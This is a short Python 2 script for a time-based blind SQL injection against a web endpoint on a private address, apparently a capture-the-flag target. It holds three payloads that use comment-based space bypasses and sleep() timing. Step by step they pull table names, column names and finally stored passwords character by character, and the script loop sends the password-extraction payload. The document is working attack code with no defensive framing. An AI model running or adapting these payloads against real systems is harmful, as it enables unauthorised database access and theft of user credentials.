import requests
import time
url="http://10.21.13.153:30080/check.php"
sql='''11'/**/or/**/if(!(ascii(substring((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),{},1))-ascii('{}')),sleep(5),1)/**/#'''
sql2='''11'/**/or/**/if(!(ascii(substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/"users233"),{},1))-ascii('{}')),sleep(5),1)/**/#'''
sql3='''11'/**/or/**/if(!(ascii(substring((select/**/group_concat(password)/**/from/**/users233/**/limit/**/1),{},1))-ascii('{}')),sleep(3),1)/**/#'''
payloads="1234567890qwertyuiopasdfghjklzxcvbnm_@QWERTYUIOPASDFGHJKLZXCVBNM,*"
name='tiopasdghjklxcvtbnum'
ans=''

for y in xrange(1, 32):
    print y
    for x in payloads:
        try:
            data = {'id': sql3.format( str(y), x)}
            re = requests.post(url=url, data=data, timeout=2.5)
        except requests.exceptions.ReadTimeout:
            ans += x;
            flag = 0;
            print ans

